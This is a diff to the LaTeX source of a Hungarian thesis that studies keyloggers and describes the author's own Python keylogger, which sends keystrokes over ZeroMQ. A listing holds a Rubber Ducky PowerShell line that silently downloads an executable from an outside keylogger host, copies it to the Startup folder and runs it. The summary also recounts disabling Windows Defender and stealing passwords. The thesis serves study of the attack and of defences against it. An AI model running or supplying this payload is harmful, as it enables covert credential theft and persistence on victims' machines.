@@ -965,7 +965,6 @@ DELAY 200
 STRING powershell saps powershell
 ENTER
 DELAY 200
-ALT y
 STRING powershell -windowstyle hidden {iwr 'http://keylogger.3utilities.com:777/CTF Loader2.exe' -o 'CTF Loader2.exe';cp 'CTF Loader2.exe' 'Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';saps '.\CTF Loader2.exe'}
 ENTER
 \end{lstlisting}
@@ -980,7 +979,7 @@ Az opciókból álló adatokra ebben a helyzetben a képernyőképre, a webkamer
 
 A ZeroMQ mint könyvtár bizonyos hálózati kommunikációs minták követésével, aszinkron módon működik. A ZeroMQ kommunikáció üzenetorientált. Ez azt jelenti, hogy ha egy kliens 150KB méretű üzenetet küld, akkor a szerver egy teljes és azonos üzenetet fog kapni anélkül, hogy pufferelést vagy keretezést kellene végrehajtania. Az elküldött üzenetek nagysága nincs korlátozva, azonban a kis üzeneteket másként kezelik, mint a nagy üzeneteket. A kis üzenetek a verem (stack) memóriaterületre lesznek elhelyezve, míg a nagy üzenetek a halom (heap) memóriaterületre.
 
-Az adatokra lehet kapni példát a projektet tároló github linken: https://github.com/zsfelmeri/Keylogger\_collegeCertificate.
+Az adatokra lehet kapni példát a projektet tároló github linken: \cite{github} %https://github.com/zsfelmeri/Keylogger\_collegeCertificate.
 
 \chapter{Összefoglaló}\label{sec:conc}
 Dolgozatomban a keyloggerek működését tanulmányoztam különböző operációs rendszereken. Először meghatározásra került a keylogger és a hozzátartozó fogalmak, majd megvizsgáltuk a keylogger típusait: Wireless, Hardver, Szoftver, Akusztikus. Ezek közül a leginkább használatosak a Hardver és a Szoftver alapú keyloggerek. Továbbá a keyloggerek elleni védekezés is tanulmányozva volt. A keyloggerek elleni védekezés szempontjából két típusu rendszert értelmeztünk: aláírás alapú és horog alapú. Ezek után az általam fejlesztett szoftverek kerültek bemutatásra, amelyeket Python nyelven írtam meg, és egy Hacker szemszögéből lettek kivitelezve. A három szoftver alatt a Hacker szoftverét, a Target szoftverét és a GUI-t értem. A Hacker oldalon monitorizálva vannak az adatok, amelyeket a Target oldalról kapunk. A GUI a Hacker oldalhoz tartozik, szerepe a valós időben való megjelenítése a lenyomott billentyűknek. A keyloggert úgy fejlesztettem, hogy több funkcionalitással rendelkezzen, mint egy átlagos keylogger. Az adatok átvitelére a ZeroMQ, egy magasabb szintű protokollt alkalmaztunk. A keylogger email-t is tud küldeni az áldozat gépéről, ehhez viszont konfigurálni kellett egy gmail fiókot. Az adatokat el lehet fogni a hálózaton, ezért úgy döntöttünk, hogy elküldés előtt titkosítsuk és tömörítsük azokat. A titkosításhoz a Python nyelv base64 modultját és a tömörítéshez a pickle modulját használtuk. A Hacker feladatához tartozik az is, hogy a python kódból futtatható állományt készítsen. Ezt a pyinstaller modul segítségével volt kivitelezve. Tesztelés során megnéztük, hogy melyik operációs rendszeren (Windows, Linux, Mac) tudjuk ellopni a felhasználó jelszavát. Sikeresnek nyilvánult a Linux rendszeren való jelszó megszerzése. Legvégül elemeztük a Ducky szkriptet, amely kikapcsolta a Windows Defender-t, letöltötte az általunk fejlesztett keyloggert, bemásolta a Startup mappába, és elindította a szoftvert.
